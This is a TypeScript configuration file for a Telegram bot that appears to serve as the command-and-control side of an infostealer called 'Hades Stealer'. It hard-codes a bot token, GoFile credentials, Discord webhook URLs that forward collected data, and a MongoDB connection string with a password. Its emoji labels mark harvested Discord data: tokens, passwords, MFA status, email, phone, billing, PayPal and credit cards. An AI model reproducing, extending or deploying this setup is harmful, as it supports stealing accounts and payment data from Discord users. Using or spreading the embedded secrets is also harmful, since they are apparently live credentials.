import { Context, Telegraf } from "telegraf";
import { Update } from "telegraf/typings/core/types/typegram";
import dotenv from 'dotenv';

dotenv.config();

export const TOKEN = "8586476563:AAEqHHBwjv73hgMhCsmZ7j1CdC1XtlKJAyk";
export const PREFIX = "!";
export const OWNER_ID: string | null = "7986121972"
export const GOFILE_SETTINGS = { token: "h3NzFkO1KiQyya50DmzTpRosCHjvzlmS", id: "87aeb7b8-8804-449e-98a5-b3ad59ccebd3" }
export const COMMANDS_DIR = `${__dirname}/commands`;
export const EVENTS_DIR = `${__dirname}/events`;
export const BASE_WEBHOOK_URL = "https://discord.com/api/webhooks/1473289524950990912/e23T2Iw4POoWRprxEJIiSL9DcFDLfMmQgDGEOEwJ5S-RGbWVHrm7JmUNWSYREqyOBczI"// "https://discord.com/api/webhooks/1460648252746629154/8c8afagwCEBvmuiRACmKnqeHlG4BzftOGTzJJ8jKui8mi4AAZXHPmfuvVJ2qjEp3xTXT";
export const BOT_OPTIONS = {} as Partial<Telegraf.Options<Context<Update>>>;

export const MONGO_URI = 'mongodb+srv://decardoza12e_db_user:NdSdrHBi5xj1gFm8@hades.tnankoc.mongodb.net/hadestealer?retryWrites=true&w=majority';
export const WEBHOOK_FORWARD_DELAY_MS = 10 * 1000;
export const API_PORT = 3000;

export const EMOJIS = {
    newPass: "<:newpassword:1470361797784633366>",
    oldPass: "<:oldpassword:1470361812984660171>",
    Duz: '<:duz:1461788888128426076>',
    GorunenAd: '<:gorunenad:1461788870789173288>',
    HadesLogo: '<:hadestealerlogo:1461790905978720502>',
    Gorev: '<:gorev:1461789854701588603>',
    Kilit: '<:kilit:1460412226346291313>',

    Mail: '<:mail:1461789973060522047>',
    Mfa: '<:mfa:1461789899031052400>',
    Token: '<:token:1461789874276405352>',
    Telefon: '<:phone:1461789920959139880>',

    Billing: '<:creditcard:1461789995542249626>',
    Paypal: '<:paypal:1461790101460881502>',
    CreditCard: '<:creditcard2:1461790017700757524>',

    EarlySupporter: '<:early:1461788364503122193>',
    BotDeveloper: '<:botdev:1461788133656891494>',
    HypesquadEvents: '<:hypesquadevents:1461788386468827178>',
    Partner: '<:partner:1461788532602572900>',
    Moderator: '<:mod:1461788477023719648>',
    BugHunter1: '<:bughunter1:1461788406991294464>',
    BugHunter2: '<:bughunter2:1461788420941680804>',
    Badge: '<:badge:1460412351642734632>',
    Personality: '<:personal:1461788780984795239>',
    Orbs: '<:orbs:1461789663336599596>',

    Bravery: '<:bravery:1461788094973083871>',
    Brilliance: '<:brilliance:1461788111548715048>',
    Balance: '<:balance:1461788063016681535>',

    Gumus: '<:gumus:1461789459208077504>',
    Bronz: '<:bronz:1461788913436852518>',
    Platin: '<:platin:1461794224138748202>',
    Elmas: '<:elmas:1461789554263592982>',
    Zumrut: '<:zumrut:1461789577126609136>',
    Yakut: '<:yakut:1461789593144656017>',
    Opal: '<:opal:1461789611029303336>',
    Altin: '<:altin:1460407869240381491>',

    Booster_1ay: '<:1ay:1461787937766248721>',
    Booster_2ay: '<:2ay:1461787950575780066>',
    Booster_3ay: '<:3ay:1460570074845937726>',
    Booster_6ay: '<:6ay:1461787983098282218>',
    Booster_9ay: '<:9ay:1461787995865616437>',
    Booster_12ay: '<:12ay:1461788007509135533>',
    Booster_15ay: '<:15ay:1461788021346144424>',
    Booster_18ay: '<:18ay:1461788033257832663>',
    Booster_24ay: '<:24ay:1461788048806383770>',
}